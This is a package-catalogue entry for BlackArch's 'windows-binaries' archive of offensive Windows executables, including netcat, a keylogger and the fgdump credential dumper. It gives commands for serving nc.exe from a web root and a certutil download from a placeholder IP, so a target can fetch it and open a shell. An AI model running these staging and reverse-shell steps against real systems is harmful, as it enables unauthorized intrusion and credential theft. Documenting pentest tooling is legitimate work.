---
name: "windows-binaries"
categories:
  - blackarch-windows
version: "20.7d272da"
homepage: "https://github.com/BlackArch/windows-binaries"
packaged-by: [blackarch, kali, aur]
blackarch-builddate: "2020-09-22"
build-system: windows
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "BlackArch/windows-binaries"
github-stars: 10
github-pushed: "2020-10-13"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# windows-binaries

> A repository of ready-to-run Windows pentest binaries (netcat, wget, plink, fgdump, ...) — an archive, not a program.

## What it's for

`windows-binaries` is BlackArch's collection of classic standalone Windows executables for staging onto lab targets: `nc.exe`/`ncat.exe` (netcat), `wget.exe`, `plink32.exe`/`plink64.exe` (PuTTY link), `sbd.exe`, `whoami.exe`, `radmin.exe`, `vncviewer.exe`, `klogger.exe`, `exe2bat.exe`, the Hyperion packer zip, plus folders such as `fgdump/` (local credential dumping), `enumplus/`, `fport/`, `mbenum/` and `nbtenum/`. It is not a tool with a CLI of its own — each file is an independent third-party binary (with its own upstream and its own vault note where applicable). Typical use: copy the one you need out of the packaged directory and deliver it to a Windows host by whatever channel the engagement allows. Treat the binaries as what they are — largely unmaintained offensive tools — and stage them only into authorized environments.

## Typical use cases

### Inventory the available binaries

See what the collection ships on this system before choosing what to stage.

```
ls /usr/share/windows-binaries/
```

Outcome: lists the archive's contents — netcat variants, wget, plink, sbd, whoami, klogger, fgdump/, enumplus/, and the rest — so you can pick the right tool and see its exact filename for the next step.

### Stage netcat onto a Windows target

Copy a binary into a directory you already serve to the target network.

```
sudo cp /usr/share/windows-binaries/nc.exe /var/www/html/
```

Outcome: `nc.exe` is now reachable over the web server's root; a target Windows host can fetch it (`certutil -urlcache -f http://198.51.100.10/nc.exe nc.exe` or a browser) and run it to open a shell/relay, which you then operate from your side with the matching netcat listener.

*Corpus evidence: staging `/usr/share/windows-binaries/nc.exe` into a served directory; contents verified against the BlackArch/windows-binaries repository tree.*
